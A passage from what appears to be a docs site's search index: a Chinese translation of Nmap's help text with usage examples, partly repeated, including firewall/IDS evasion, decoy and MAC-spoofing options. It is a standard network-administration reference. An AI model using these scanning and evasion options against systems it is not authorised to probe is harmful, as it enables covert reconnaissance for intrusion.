\u4f7f\u7528\u4f2a\u88c5\u4e3b\u673a\u8fdb\u884c\u6b3a\u9a97 -S <IP\u5730\u5740>: \u4f7f\u7528\u6307\u5b9a\u7684\u6e90\u5730\u5740 -e <\u63a5\u53e3>: \u4f7f\u7528\u6307\u5b9a\u7684\u7f51\u7edc\u63a5\u53e3 --source-port <\u7aef\u53e3>: \u4f7f\u7528\u6307\u5b9a\u7684\u6e90\u7aef\u53e3 --proxies <url1,[url2],...>: \u901a\u8fc7HTTP/SOCKS4/SOCKS5\u4ee3\u7406\u626b\u63cf --data-length <\u6570\u91cf>: \u5728\u5305\u4e2d\u6dfb\u52a0\u968f\u673a\u6570\u636e --ip-options <\u9009\u9879>: \u4f7f\u7528\u81ea\u5b9a\u4e49\u7684IP\u9009\u9879 --ttl <\u503c>: \u8bbe\u7f6eIP\u751f\u5b58\u65f6\u95f4 --spoof-mac <MAC\u5730\u5740/\u524d\u7f00/\u4f9b\u5e94\u5546>: \u4f2a\u88c5MAC\u5730\u5740 --badsum: \u53d1\u9001\u5e26\u6709\u9519\u8bef\u6821\u9a8c\u548c\u7684\u5305 \u8f93\u51fa: -oN/-oX/-oS/-oG <\u6587\u4ef6>: \u6b63\u5e38\uff0cXML\uff0cs|<rIpt kIddi3 \u548c Grepable\u8f93\u51fa -oA <basename>: \u8f93\u51fa\u6240\u6709\u683c\u5f0f (-oN, -oX, -oS, -oG) -v: \u589e\u52a0\u8be6\u7ec6\u5ea6\u7b49\u7ea7 (\u4f7f\u7528\u4e24\u6b21\u6216\u66f4\u591a\u4ee5\u83b7\u53d6\u66f4\u591a\u4fe1\u606f) --version-all: \u663e\u793a\u6240\u6709\u7248\u672c\u53f7 --open: \u4ec5\u663e\u793a\u5f00\u653e\u7684 (\u6216\u53ef\u80fd\u5f00\u653e\u7684) \u7aef\u53e3 --packet-trace: \u663e\u793a\u7f51\u7edc\u5305\u8ddf\u8e2a --iflist: \u5217\u51fa\u63a5\u53e3\u548c\u8def\u7531 (\u7528\u4e8e\u8c03\u8bd5) --append-output: \u9644\u52a0\u5230\u800c\u4e0d\u662f\u8986\u76d6\u8f93\u51fa\u6587\u4ef6 --resume <\u6587\u4ef6\u540d>: \u4ece\u4e4b\u524d\u4e2d\u65ad\u7684\u626b\u63cf\u7ee7\u7eed --stylesheet <path/URL>: \u81ea\u5b9a\u4e49XSL\u6837\u5f0f\u8868 --webxml: \u5f15\u7528 http://nmap.org/svn/docs/nmap.xsl \u7684\u7f51\u7edc\u6837\u5f0f\u8868 --no-stylesheet: \u7981\u7528\u6837\u5f0f\u8868 \u5176\u4ed6: -6: \u542f\u7528IPv6\u626b\u63cf -A: \u542f\u7528\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u548c\u7248\u672c\u68c0\u6d4b\uff0c\u811a\u672c\u626b\u63cf\u548ctraceroute --datadir <\u76ee\u5f55>: \u6307\u5b9a\u81ea\u5b9a\u4e49\u6570\u636e\u6587\u4ef6\u7684\u4f4d\u7f6e --send-eth/--send-ip: \u4f7f\u7528\u4ee5\u592a\u7f51\u5e27/IP\u6570\u636e\u5305\u53d1\u9001 (\u4ec5\u9650root\u7528\u6237) --privileged: \u5047\u8bbe\u7528\u6237\u6709\u6743\u9650 (\u8df3\u8fc7\u6743\u9650\u68c0\u67e5) --unprivileged: \u5047\u8bbe\u7528\u6237\u65e0\u6743\u9650 (\u8df3\u8fc7\u6743\u9650\u68c0\u67e5) -V: \u663e\u793a\u7248\u672c\u53f7 -h: \u663e\u793a\u5e2e\u52a9\u6458\u8981 \u4f8b\u5b50: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.1/24 nmap -v -Pn -p 80,443,8080 -oA scanme 192.168.0.1 nmap -6 fe80::202:b3ff:fe1e:8329 nmap -v -sV -T4 -O -F --version-light 192.168.0.1 \u8fd9\u91cc\u6709\u51e0\u4e2aNmap\u7684\u5e38\u7528\u7528\u6cd5\uff1a \u57fa\u672c\u4e3b\u673a\u626b\u63cf : nmap 192.168.1.1 \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u626b\u63cfIP\u5730\u5740\u4e3a192.168.1.1\u7684\u4e3b\u673a\u4e0a\u5f00\u653e\u7684\u7aef\u53e3\u3002 \u626b\u63cf\u6574\u4e2a\u5b50\u7f51 : nmap 192.168.1.0/24 \u8fd9\u5c06\u626b\u63cf192.168.1.0\u5230192.168.1.255\u7684\u6240\u6709IP\u5730\u5740\u3002 \u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b : nmap -A 192.168.1.1 -A \u9009\u9879\u4f1a\u5f00\u542f\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u3001\u7248\u672c\u68c0\u6d4b\u3001\u811a\u672c\u626b\u63cf\u548ctraceroute\u3002 \u626b\u63cf\u7279\u5b9a\u7aef\u53e3 : nmap -p 80,443 192.168.1.1 \u8fd9\u4f1a\u626b\u63cf\u76ee\u6807\u4e3b\u673a\u768480\u548c443\u7aef\u53e3\u3002 \u5feb\u901f\u626b\u63cf : nmap -T4 -F 192.168.1.1 -T4 \u9009\u9879\u52a0\u901f\u626b\u63cf\uff0c\u800c -F \u9009\u9879\u9650\u5236\u626b\u63cf\u5230\u6700\u5e38\u89c1\u7684\u7aef\u53e3\u3002 \u4e0d\u8fdb\u884cping\u68c0\u6d4b : nmap -Pn 192.168.1.1 -Pn \u9009\u9879\u8df3\u8fc7ping\u68c0\u6d4b\uff0c\u5bf9\u4e8e\u9632\u706b\u5899\u540e\u9762\u7684\u4e3b\u673a\u7279\u522b\u6709\u7528\u3002 \u626b\u63cfTCP\u548cUDP\u7aef\u53e3 : nmap -sS -sU -p T:22,80,U:53,111,137 192.168.1.1 \u8fd9\u5c06\u540c\u65f6\u626b\u63cfTCP\u548cUDP\u7aef\u53e3\u3002 \u811a\u672c\u626b\u63cf : nmap --script=default -p 443 192.168.1.1 \u4f7f\u7528\u9ed8\u8ba4\u811a\u672c\u96c6\u5bf9\u76ee\u6807\u4e3b\u673a\u7684443\u7aef\u53e3\u8fdb\u884c\u811a\u672c\u626b\u63cf\u3002 \u8fd9\u91cc\u6709\u51e0\u4e2a\u66f4\u5b9e\u7528\u7684Nmap\u7528\u6cd5\uff1a \u4ec5\u663e\u793a\u5f00\u653e\u7684\u7aef\u53e3 : nmap --open 192.168.1.1 \u4f7f\u7528 --open \u9009\u9879\u53ea\u663e\u793a\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u653e\u7684\u7aef\u53e3\u3002 \u626b\u63cf\u7279\u5b9a\u7684\u670d\u52a1\u7248\u672c : nmap -sV 192.168.1.1 -sV \u9009\u9879\u53ef\u4ee5\u68c0\u6d4b\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684\u670d\u52a1\u53ca\u5176\u7248\u672c\u3002 \u4f7f\u7528\u7279\u5b9a\u7684\u811a\u672c : nmap --script=http-title 192.168.1.1 \u8fd9\u5c06\u4f7f\u7528 http-title \u811a\u672c\u6765\u83b7\u53d6\u76ee\u6807\u7f51\u7ad9\u7684\u6807\u9898\u3002 \u8f93\u51fa\u626b\u63cf\u7ed3\u679c\u5230\u6587\u4ef6 : nmap -oN scan_results.txt 192.168.1.1 -oN \u9009\u9879\u5c06\u626b\u63cf\u7ed3\u679c\u8f93\u51fa\u5230 scan_results.txt \u6587\u4ef6\u4e2d\u3002 \u626b\u63cf\u7279\u5b9a\u534f\u8bae\u7684\u7aef\u53e3 : nmap -sU -p U:53,111,137 192.168.1.1 \u8fd9\u4e2a\u547d\u4ee4\u626b\u63cf\u76ee\u6807\u4e3b\u673a\u4e0a\u6307\u5b9a\u7684UDP\u7aef\u53e3\u3002 \u6267\u884c\u6fc0\u8fdb\u7684OS\u548c\u670d\u52a1\u68c0\u6d4b : nmap -A -T4 192.168.1.1 -A \u5f00\u542fOS\u68c0\u6d4b\u3001\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3001\u811a\u672c\u626b\u63cf\u548ctraceroute\uff0c -T4 \u52a0\u5feb\u626b\u63cf\u901f\u5ea6\u3002 \u6392\u9664\u7279\u5b9a\u7684\u4e3b\u673a\u6216\u7f51\u7edc : nmap 192.168.1.0/24 --exclude 192.168.1.5 \u8fd9\u4f1a\u626b\u63cf192.168.1.0/24\u5b50\u7f51\u4e2d\u7684\u6240\u6709\u4e3b\u673a\uff0c\u4f46\u6392\u9664\u4e86192.168.1.5\u3002 TCP SYN\u626b\u63cf : nmap -sS 192.168.1.1 -sS \u6267\u884cTCP SYN\u626b\u63cf\uff0c\u8fd9\u662f\u4e00\u79cd\u8f83\u4e3a\u9690\u853d\u7684\u626b\u63cf\u65b9\u5f0f\u3002 \u8bb0\u5f97\u4f7f\u7528Nmap\u65f6\u8981\u9075\u5b88\u6cd5\u5f8b\u548c\u9053\u5fb7\u51c6\u5219\uff0c\u53ea\u5728\u6388\u6743\u7684\u73af\u5883\u4e2d\u8fdb\u884c\u626b\u63cf\u3002 \u5feb\u901f\u626b\u63cf\u6240\u6709\u7aef\u53e3\uff1a nmap -p 1-65535 -T4 --min-rate 1000 --max-retries 1 -n --host-timeout 30m <\u76ee\u6807IP> -p 1-65535\uff1a\u626b\u63cf\u4ece\u7aef\u53e31\u523065535\u7684\u6240\u6709\u7aef\u53e3\u3002 -T4\uff1a\u8bbe\u7f6e\u626b\u63cf\u7684\u901f\u5ea6\u4e3a\u8f83\u5feb\u3002 --min-rate 1000\uff1a\u8bbe\u7f6e\u6bcf\u79d2\u6700\u5c11\u53d1\u90011000\u4e2a\u5305\u3002 --max-retries 1\uff1a\u6bcf\u4e2a\u7aef\u53e3\u53ea\u91cd\u8bd5\u4e00\u6b21\u3002 -n\uff1a\u7981\u7528DNS\u89e3\u6790\uff0c\u52a0\u5feb\u626b\u63cf\u901f\u5ea6\u3002 --host-timeout 30m\uff1a\u5982\u679c\u4e00\u4e2a\u4e3b\u673a\u7684\u626b\u63cf\u8d85\u8fc730\u5206\u949f\u5219\u653e\u5f03\u626b\u63cf\u3002 <\u76ee\u6807IP>\uff1a\u60a8\u8981\u626b\u63cf\u7684\u76ee\u6807IP\u5730\u5740\u3002 Nmap\u4f7f\u7528\u6559\u7a0b\uff08\u521d\u7ea7\u7bc7\uff09 - zha0gongz1 - \u535a\u5ba2\u56ed (cnblogs.com) Nmap\u4f7f\u7528\u6559\u7a0b\uff08\u8fdb\u9636\u7bc7\uff09 - zha0gongz1 - \u535a\u5ba2\u56ed (cnblogs.com) (42\u6761\u6d88\u606f) Nmap\u5e38\u7528\u547d\u4ee4_\u767e\u5bc6\u4e0d\u758f\u7684\u535a\u5ba2-CSDN\u535a\u5ba2","title":"nmap\u547d\u4ee4"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/nmap/#nmap","text":"\u5728\u7ebfipv6\u68c0\u6d4b\uff1ahttp://www.ipv6scanner.com/cgi-bin/main.py nmap\u7684\u5e2e\u52a9\u624b\u518c\u771f\u7684\u662f\u53c8\u81ed\u53c8\u957f\uff0c\u53ca\u65f6\u662fhelp\u63d0\u4f9b\u7684\u5185\u5bb9\u4e5f\u975e\u5e38\u591a\uff0c\u4ee5\u4e0b\u662fgpt4\u7406\u89e3\u5e76\u7ffb\u8bd1\u7684\u5185\u5bb9\u3002 nmap - \u7f51\u7edc\u63a2\u7d22\u5de5\u5177\u3001\u5b89\u5168\u6216\u7aef\u53e3\u626b\u63cf\u4eea \u8bed\u6cd5 nmap [\u626b\u63cf\u7c7b\u578b...] [\u9009\u9879] {\u76ee\u6807\u89c4\u8303} Nmap 6.40 (http://nmap.org) \u4f7f\u7528\u65b9\u5f0f: nmap [\u626b\u63cf\u7c7b\u578b] [\u9009\u9879] {\u76ee\u6807\u89c4\u8303} \u76ee\u6807\u89c4\u8303: \u53ef\u4ee5\u8f93\u5165\u4e3b\u673a\u540d\uff0cIP\u5730\u5740\uff0c\u7f51\u7edc\u7b49\u3002 \u4f8b\u5982: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254 -iL <\u8f93\u5165\u6587\u4ef6\u540d>: \u4ece\u4e3b\u673a/\u7f51\u7edc\u5217\u8868\u6587\u4ef6\u8f93\u5165 -iR <\u4e3b\u673a\u6570\u91cf>: \u968f\u673a\u9009\u62e9\u76ee\u6807 --exclude <\u4e3b\u673a1[,\u4e3b\u673a2][,\u4e3b\u673a3],...>: \u6392\u9664\u4e3b\u673a/\u7f51\u7edc --excludefile <\u6392\u9664\u6587\u4ef6>: \u4ece\u6587\u4ef6\u6392\u9664\u5217\u8868 \u4e3b\u673a\u53d1\u73b0: -sL: \u5217\u8868\u626b\u63cf - \u4ec5\u5217\u51fa\u8981\u626b\u63cf\u7684\u76ee\u6807 -sn: Ping\u626b\u63cf - \u7981\u7528\u7aef\u53e3\u626b\u63cf -Pn: \u5c06\u6240\u6709\u4e3b\u673a\u89c6\u4e3a\u5728\u7ebf - \u8df3\u8fc7\u4e3b\u673a\u53d1\u73b0 -PS/PA/PU/PY[portlist]: \u5230\u6307\u5b9a\u7aef\u53e3\u7684TCP SYN/ACK\uff0cUDP\u6216SCTP\u53d1\u73b0 -PE/PP/PM: ICMP\u56de\u58f0\uff0c\u65f6\u95f4\u6233\u548c\u7f51\u7edc\u63a9\u7801\u8bf7\u6c42\u53d1\u73b0\u63a2\u9488 -PO[\u534f\u8bae\u5217\u8868]: IP\u534f\u8baePing -n/-R: \u4ece\u4e0d\u8fdb\u884cDNS\u89e3\u6790/\u603b\u662f\u89e3\u6790 [\u9ed8\u8ba4: \u6709\u65f6] --dns-servers <\u670d\u52a1\u56681[,\u670d\u52a1\u56682],...>: \u6307\u5b9a\u81ea\u5b9a\u4e49DNS\u670d\u52a1\u5668 --system-dns: \u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u7684DNS\u89e3\u6790\u5668 --traceroute: \u8ddf\u8e2a\u5230\u6bcf\u4e2a\u4e3b\u673a\u7684\u8df3\u8f6c\u8def\u5f84 \u626b\u63cf\u6280\u672f: -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon\u626b\u63cf -sU: UDP\u626b\u63cf -sN/sF/sX: TCP Null\uff0cFIN\u548cXmas\u626b\u63cf --scanflags <\u6807\u5fd7>: \u81ea\u5b9a\u4e49TCP\u626b\u63cf\u6807\u5fd7 -sI <\u50f5\u5c38\u4e3b\u673a[:\u63a2\u9488\u7aef\u53e3]>: \u95f2\u7f6e\u626b\u63cf -sY/sZ: SCTP INIT/COOKIE-ECHO\u626b\u63cf -sO: IP\u534f\u8bae\u626b\u63cf -b <FTP\u4e2d\u7ee7\u4e3b\u673a>: FTP\u5f39\u8df3\u626b\u63cf \u7aef\u53e3\u89c4\u8303\u548c\u626b\u63cf\u987a\u5e8f: -p <\u7aef\u53e3\u8303\u56f4>: \u4ec5\u626b\u63cf\u6307\u5b9a\u7aef\u53e3 \u4f8b\u5982: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9 -F: \u5feb\u901f\u6a21\u5f0f - \u626b\u63cf\u7684\u7aef\u53e3\u6bd4\u9ed8\u8ba4\u626b\u63cf\u5c11 -r: \u8fde\u7eed\u626b\u63cf\u7aef\u53e3 - \u4e0d\u968f\u673a\u5316 --top-ports <\u6570\u91cf>: \u626b\u63cf<\u6570\u91cf>\u4e2a\u6700\u5e38\u89c1\u7684\u7aef\u53e3 --port-ratio <\u6bd4\u4f8b>: \u626b\u63cf\u6bd4<\u6bd4\u4f8b>\u66f4\u5e38\u89c1\u7684\u7aef\u53e3 \u670d\u52a1/\u7248\u672c\u68c0\u6d4b: -sV: \u63a2\u6d4b\u5f00\u653e\u7aef\u53e3\u4ee5\u786e\u5b9a\u670d\u52a1/\u7248\u672c\u4fe1\u606f --version-intensity <\u7ea7\u522b>: \u8bbe\u7f6e\u4ece0 (\u8f7b) \u52309 (\u5c1d\u8bd5\u6240\u6709\u63a2\u9488) --version-light: \u9650\u5236\u6700\u6709\u53ef\u80fd\u7684\u63a2\u9488 (\u5f3a\u5ea62) --version-all: \u5c1d\u8bd5\u6bcf\u4e2a\u5355\u72ec\u7684\u63a2\u9488 (\u5f3a\u5ea69) --version-trace: \u663e\u793a\u8be6\u7ec6\u7248\u672c\u626b\u63cf\u6d3b\u52a8 (\u7528\u4e8e\u8c03\u8bd5) \u811a\u672c\u626b\u63cf: -sC: \u76f8\u5f53\u4e8e --script=default --script=<Lua\u811a\u672c>: <Lua\u811a\u672c>\u662f\u9017\u53f7\u5206\u9694\u7684\u76ee\u5f55\uff0c\u811a\u672c\u6587\u4ef6\u6216\u811a\u672c\u7c7b\u522b\u5217\u8868 --script-args=<n1=v1,[n2=v2,...]>: \u5411\u811a\u672c\u63d0\u4f9b\u53c2\u6570 --script-args-file=\u6587\u4ef6\u540d: \u5728\u6587\u4ef6\u4e2d\u63d0\u4f9bNSE\u811a\u672c\u53c2\u6570 --script-trace: \u663e\u793a\u53d1\u9001\u548c\u63a5\u6536\u7684\u6240\u6709\u6570\u636e --script-updatedb: \u66f4\u65b0\u811a\u672c\u6570\u636e\u5e93\u3002 --script-help=<Lua\u811a\u672c>: \u663e\u793a\u6709\u5173\u811a\u672c\u7684\u5e2e\u52a9\u3002 <Lua\u811a\u672c>\u662f\u811a\u672c\u6587\u4ef6\u6216\u811a\u672c\u7c7b\u522b\u7684\u9017\u53f7\u5206\u9694\u5217\u8868\u3002 \u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b: -O: \u542f\u7528\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b --osscan-limit: \u9650\u5236\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u5230\u6709\u5e0c\u671b\u7684\u76ee\u6807 --osscan-guess: \u66f4\u79ef\u6781\u5730\u731c\u6d4b\u64cd\u4f5c\u7cfb\u7edf \u65f6\u5e8f\u548c\u6027\u80fd: \u4f7f\u7528<time>\u7684\u9009\u9879\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff0c\u6216\u8005\u5c06'ms' (\u6beb\u79d2)\uff0c 's' (\u79d2)\uff0c'm' (\u5206\u949f) \u6216 'h' (\u5c0f\u65f6) \u6dfb\u52a0\u5230\u503c\u540e\u9762 (\u4f8b\u5982 30m)\u3002 -T<0-5>: \u8bbe\u7f6e\u65f6\u5e8f\u6a21\u677f (\u6570\u5b57\u8d8a\u9ad8\u8d8a\u5feb) --min-hostgroup/max-hostgroup <\u5927\u5c0f>: \u5e76\u884c\u4e3b\u673a\u626b\u63cf\u7ec4\u5927\u5c0f --min-parallelism/max-parallelism <\u63a2\u9488\u6570>: \u63a2\u9488\u5e76\u884c\u5316 --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: \u8bbe\u7f6eRTT\u8d85\u65f6 --max-retries <\u5c1d\u8bd5\u6b21\u6570>: \u8bbe\u7f6e\u6700\u5927\u91cd\u8bd5\u6b21\u6570 --host-timeout <\u65f6\u95f4>: \u653e\u5f03\u5bf9\u76ee\u6807\u7684\u626b\u63cf --scan-delay/--max-scan-delay <\u65f6\u95f4>: \u8c03\u6574\u63a2\u9488\u4e4b\u95f4\u7684\u65f6\u95f4 --min-rate <\u901f\u7387>: \u53d1\u9001\u63a2\u9488\u7684\u6700\u5c0f\u901f\u7387 --max-rate <\u901f\u7387>: \u53d1\u9001\u63a2\u9488\u7684\u6700\u5927\u901f\u7387 \u9632\u706b\u5899/IDS\u8eb2\u907f\u548c\u6b3a\u9a97: -f; --mtu <\u503c>: \u5206\u6bb5\u626b\u63cf; \u6307\u5b9a\u81ea\u5b9a\u4e49\u7684MTU -D <\u4f2a\u88c5\u4e3b\u673a1,2,...>: \u4f7f\u7528\u4f2a\u88c5\u4e3b\u673a\u8fdb\u884c\u6b3a\u9a97 -S <IP\u5730\u5740>: \u4f7f\u7528\u6307\u5b9a\u7684\u6e90\u5730\u5740 -e <\u63a5\u53e3>: \u4f7f\u7528\u6307\u5b9a\u7684\u7f51\u7edc\u63a5\u53e3 --source-port <\u7aef\u53e3>: \u4f7f\u7528\u6307\u5b9a\u7684\u6e90\u7aef\u53e3 --proxies <url1,[url2],...>: \u901a\u8fc7HTTP/SOCKS4/SOCKS5\u4ee3\u7406\u626b\u63cf --data-length <\u6570\u91cf>: \u5728\u5305\u4e2d\u6dfb\u52a0\u968f\u673a\u6570\u636e --ip-options <\u9009\u9879>: \u4f7f\u7528\u81ea\u5b9a\u4e49\u7684IP\u9009\u9879 --ttl <\u503c>: \u8bbe\u7f6eIP\u751f\u5b58\u65f6\u95f4 --spoof-mac <MAC\u5730\u5740/\u524d\u7f00/\u4f9b\u5e94\u5546>: \u4f2a\u88c5MAC\u5730\u5740 --badsum: \u53d1\u9001\u5e26\u6709\u9519\u8bef\u6821\u9a8c\u548c\u7684\u5305 \u8f93\u51fa: -oN/-oX/-oS/-oG <\u6587\u4ef6>: \u6b63\u5e38\uff0cXML\uff0cs|<rIpt kIddi3 \u548c Grepable\u8f93\u51fa -oA <basename>: \u8f93\u51fa\u6240\u6709\u683c\u5f0f (-oN, -oX, -oS, -oG) -v: \u589e\u52a0\u8be6\u7ec6\u5ea6\u7b49\u7ea7 (\u4f7f\u7528\u4e24\u6b21\u6216\u66f4\u591a\u4ee5\u83b7\u53d6\u66f4\u591a\u4fe1\u606f) --version-all: \u663e\u793a\u6240\u6709\u7248\u672c\u53f7 --open: \u4ec5\u663e\u793a\u5f00\u653e\u7684 (\u6216\u53ef\u80fd\u5f00\u653e\u7684) \u7aef\u53e3 --packet-trace: \u663e\u793a\u7f51\u7edc\u5305\u8ddf\u8e2a --iflist: \u5217\u51fa\u63a5\u53e3\u548c\u8def\u7531 (\u7528\u4e8e\u8c03\u8bd5) --append-output: \u9644\u52a0\u5230\u800c\u4e0d\u662f\u8986\u76d6\u8f93\u51fa\u6587\u4ef6 --resume <\u6587\u4ef6\u540d>: \u4ece\u4e4b\u524d\u4e2d\u65ad\u7684\u626b\u63cf\u7ee7\u7eed --stylesheet <path/URL>: \u81ea\u5b9a\u4e49XSL\u6837\u5f0f\u8868 --webxml: \u5f15\u7528 http://nmap.org/svn/docs/nmap.xsl \u7684\u7f51\u7edc\u6837\u5f0f\u8868 --no-stylesheet: \u7981\u7528\u6837\u5f0f\u8868 \u5176\u4ed6: -6: \u542f\u7528IPv6\u626b\u63cf -A: \u542f\u7528\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u548c\u7248\u672c\u68c0\u6d4b\uff0c\u811a\u672c\u626b\u63cf\u548ctraceroute --datadir <\u76ee\u5f55>: \u6307\u5b9a\u81ea\u5b9a\u4e49\u6570\u636e\u6587\u4ef6\u7684\u4f4d\u7f6e --send-eth/--send-ip: \u4f7f\u7528\u4ee5\u592a\u7f51\u5e27/IP\u6570\u636e\u5305\u53d1\u9001 (\u4ec5\u9650root\u7528\u6237) --privileged: \u5047\u8bbe\u7528\u6237\u6709\u6743\u9650 (\u8df3\u8fc7\u6743\u9650\u68c0\u67e5) --unprivileged: \u5047\u8bbe\u7528\u6237\u65e0\u6743\u9650 (\u8df3\u8fc7\u6743\u9650\u68c0\u67e5) -V: \u663e\u793a\u7248\u672c\u53f7 -h: \u663e\u793a\u5e2e\u52a9\u6458\u8981 \u4f8b\u5b50: nmap -v -A scanme.nmap.org nmap -v -sn 192.168.0.1/24 nmap -v -Pn -p 80,443,8080 -oA scanme 192.168.0.1 nmap -6 fe80::202:b3ff:fe1e:8329 nmap -v -sV -T4 -O -F --version-light 192.168.0.1 \u8fd9\u91cc\u6709\u51e0\u4e2aNmap\u7684\u5e38\u7528\u7528\u6cd5\uff1a \u57fa\u672c\u4e3b\u673a\u626b\u63cf : nmap 192.168.1.1 \u8fd9\u4e2a\u547d\u4ee4\u4f1a\u626b\u63cfIP\u5730\u5740\u4e3a192.168.1.1\u7684\u4e3b\u673a\u4e0a\u5f00\u653e\u7684\u7aef\u53e3\u3002 \u626b\u63cf\u6574\u4e2a\u5b50\u7f51 : nmap 192.168.1.0/24 \u8fd9\u5c06\u626b\u63cf192.168.1.0\u5230192.168.1.255\u7684\u6240\u6709IP\u5730\u5740\u3002 \u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b : nmap -A 192.168.1.1 -A \u9009\u9879\u4f1a\u5f00\u542f\u64cd\u4f5c\u7cfb\u7edf\u68c0\u6d4b\u3001\u7248\u672c\u68c0\u6d4b\u3001\u811a\u672c\u626b\u63cf\u548ctraceroute\u3002 \u626b\u63cf\u7279\u5b9a\u7aef\u53e3 : nmap -p 80,443 192.168.1.1 \u8fd9\u4f1a\u626b\u63cf\u76ee\u6807\u4e3b\u673a\u768480\u548c443\u7aef\u53e3\u3002 \u5feb\u901f\u626b\u63cf : nmap -T4 -F 192.168.1.1 -T4 \u9009\u9879\u52a0\u901f\u626b\u63cf\uff0c\u800c -F \u9009\u9879\u9650\u5236\u626b\u63cf\u5230\u6700\u5e38\u89c1\u7684\u7aef\u53e3\u3002 \u4e0d\u8fdb\u884cping\u68c0\u6d4b : nmap -Pn 192.168.1.1 -Pn \u9009\u9879\u8df3\u8fc7ping\u68c0\u6d4b\uff0c\u5bf9\u4e8e\u9632\u706b\u5899\u540e\u9762\u7684\u4e3b\u673a\u7279\u522b\u6709\u7528\u3002 \u626b\u63cfTCP\u548cUDP\u7aef\u53e3 : nmap -sS -sU -p T:22,80,U:53,111,137 192.168.1.1 \u8fd9\u5c06\u540c\u65f6\u626b\u63cfTCP\u548cUDP\u7aef\u53e3\u3002 \u811a\u672c\u626b\u63cf : nmap --script=default -p 443 192.168.1.1 \u4f7f\u7528\u9ed8\u8ba4\u811a\u672c\u96c6\u5bf9\u76ee\u6807\u4e3b\u673a\u7684443\u7aef\u53e3\u8fdb\u884c\u811a\u672c\u626b\u63cf\u3002 \u8fd9\u91cc\u6709\u51e0\u4e2a\u66f4\u5b9e\u7528\u7684Nmap\u7528\u6cd5\uff1a \u4ec5\u663e\u793a\u5f00\u653e\u7684\u7aef\u53e3 : nmap --open 192.168.1.1 \u4f7f\u7528 --open \u9009\u9879\u53ea\u663e\u793a\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u653e\u7684\u7aef\u53e3\u3002 \u626b\u63cf\u7279\u5b9a\u7684\u670d\u52a1\u7248\u672c : nmap -sV 192.168.1.1 -sV \u9009\u9879\u53ef\u4ee5\u68c0\u6d4b\u7aef\u53e3\u4e0a\u8fd0\u884c\u7684\u670d\u52a1\u53ca\u5176\u7248\u672c\u3002 \u4f7f\u7528\u7279\u5b9a\u7684\u811a\u672c : nmap --script=http-title 192.168.1.1 \u8fd9\u5c06\u4f7f\u7528 http-title \u811a\u672c\u6765\u83b7\u53d6\u76ee\u6807\u7f51\u7ad9\u7684\u6807\u9898\u3002 \u8f93\u51fa\u626b\u63cf\u7ed3\u679c\u5230\u6587\u4ef6 : nmap -oN scan_results.txt 192.168.1.1 -oN \u9009\u9879\u5c06\u626b\u63cf\u7ed3\u679c\u8f93\u51fa\u5230 scan_results.txt \u6587\u4ef6\u4e2d\u3002 \u626b\u63cf\u7279\u5b9a\u534f\u8bae\u7684\u7aef\u53e3 : nmap -sU -p U:53,111,137 192.168.1.1 \u8fd9\u4e2a\u547d\u4ee4\u626b\u63cf\u76ee\u6807\u4e3b\u673a\u4e0a\u6307\u5b9a\u7684UDP\u7aef\u53e3\u3002 \u6267\u884c\u6fc0\u8fdb\u7684OS\u548c\u670d\u52a1\u68c0\u6d4b : nmap -A -T4 192.168.1.1 -A \u5f00\u542fOS\u68c0\u6d4b\u3001\u670d\u52a1\u7248\u672c\u68c0\u6d4b\u3001\u811a\u672c\u626b\u63cf\u548ctraceroute\uff0c -T4 \u52a0\u5feb\u626b\u63cf\u901f\u5ea6\u3002 \u6392\u9664\u7279\u5b9a\u7684\u4e3b\u673a\u6216\u7f51\u7edc : nmap 192.168.1.0/24 --exclude 192.168.1.5 \u8fd9\u4f1a\u626b\u63cf192.168.1.0/24\u5b50\u7f51\u4e2d\u7684\u6240\u6709\u4e3b\u673a\uff0c\u4f46\u6392\u9664\u4e86192.168.1.5\u3002 TCP SYN\u626b\u63cf : nmap -sS 192.168.1.1 -sS \u6267\u884cTCP SYN\u626b\u63cf\uff0c\u8fd9\u662f\u4e00\u79cd\u8f83\u4e3a\u9690\u853d\u7684\u626b\u63cf\u65b9\u5f0f\u3002 \u8bb0\u5f97\u4f7f\u7528Nmap\u65f6\u8981\u9075\u5b88\u6cd5\u5f8b\u548c\u9053\u5fb7\u51c6\u5219\uff0c\u53ea\u5728\u6388\u6743\u7684\u73af\u5883\u4e2d\u8fdb\u884c\u626b\u63cf\u3002 \u5feb\u901f\u626b\u63cf\u6240\u6709\u7aef\u53e3\uff1a nmap -p 1-65535 -T4 --min-rate 1000 --max-retries 1 -n --host-timeout 30m <\u76ee\u6807IP> -p 1-65535\uff1a\u626b\u63cf\u4ece\u7aef\u53e31\u523065535\u7684\u6240\u6709\u7aef\u53e3\u3002 -T4\uff1a\u8bbe\u7f6e\u626b\u63cf\u7684\u901f\u5ea6\u4e3a\u8f83\u5feb\u3002 --min-rate 1000\uff1a\u8bbe\u7f6e\u6bcf\u79d2\u6700\u5c11\u53d1\u90011000\u4e2a\u5305\u3002 --max-retries 1\uff1a\u6bcf\u4e2a\u7aef\u53e3\u53ea\u91cd\u8bd5\u4e00\u6b21\u3002 -n\uff1a\u7981\u7528DNS\u89e3\u6790\uff0c\u52a0\u5feb\u626b\u63cf\u901f\u5ea6\u3002 --host-timeout 30m\uff1a\u5982\u679c\u4e00\u4e2a\u4e3b\u673a\u7684\u626b\u63cf\u8d85\u8fc730\u5206\u949f\u5219\u653e\u5f03\u626b\u63cf\u3002 